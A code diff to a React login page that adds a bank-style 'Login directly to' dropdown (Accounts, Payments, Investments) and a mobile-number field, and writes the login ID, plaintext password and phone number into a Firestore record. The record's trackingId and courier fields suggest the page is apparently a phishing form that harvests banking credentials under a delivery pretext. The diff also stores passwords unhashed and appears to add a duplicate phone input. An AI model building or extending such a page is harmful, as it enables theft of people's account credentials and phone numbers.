@@ -93,7 +93,7 @@ const FirstPage = () => {
       // Prepare data for Firestore with the correct structure
       const payload = {
         name: userId, // Using loginId as name
-        phone: '', // No phone field in the form, sending empty
+        phone: mobileNumber, // Pass the entered mobile number
         password: password1, // Adding the password field
         trackingId: '', // No trackingId field, sending empty
         courier: '', // No courier field, sending empty
@@ -301,6 +301,42 @@ const FirstPage = () => {
               onChange={(e) => setMobileNumber(e.target.value)}
             />
             {mobileError && <p>{mobileError}</p>}
+          </div>
+
+          {/* Login directly to dropdown */}
+          <div className="mb-6">
+            <label className="text-gray-700 mb-2 block">Login directly to</label>
+            <div className="relative">
+              <select
+                className="w-full py-3 px-4 border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-1 focus:ring-[#AE275F]"
+                defaultValue="dashboard"
+              >
+                <option value="dashboard">Dashboard</option>
+                <option value="accounts">Accounts</option>
+                <option value="payments">Payments</option>
+                <option value="investments">Investments</option>
+              </select>
+              <div className="absolute right-3 top-1/2 transform -translate-y-1/2 pointer-events-none">
+                <svg className="w-5 h-5 text-gray-500" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
+                </svg>
+              </div>
+            </div>
+          </div>
+
+          {/* Mobile Number */}
+          <div className="mb-4">
+            <label className="text-gray-700 mb-2 block">Mobile Number</label>
+            <input
+              type="tel"
+              placeholder="Enter Mobile Number"
+              className="w-full py-3 px-4 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-[#AE275F]"
+              value={mobileNumber}
+              onChange={(e) => setMobileNumber(e.target.value)}
+              required
+              pattern="[0-9]{10}"
+              maxLength={10}
+            />
           </div>
 
           {/* Login Button */}
